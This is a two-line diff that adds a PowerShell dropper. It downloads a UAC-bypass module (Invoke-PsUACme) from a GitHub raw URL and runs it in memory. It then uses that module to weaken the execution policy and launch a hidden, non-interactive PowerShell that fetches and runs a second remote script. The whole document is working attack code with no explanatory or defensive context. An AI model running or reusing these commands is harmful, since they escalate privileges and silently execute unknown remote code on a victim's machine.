@@ -1,0 +1,2 @@
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/black-dragoney/hello-word/master/pucme.ps1')
+Invoke-PsUACme -Payload "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -c ""Set-ExecutionPolicy Remotesigned -Force"" & C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden IEX ((New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/black-dragoney/hello-word/master/Untitled05.ps1'))"
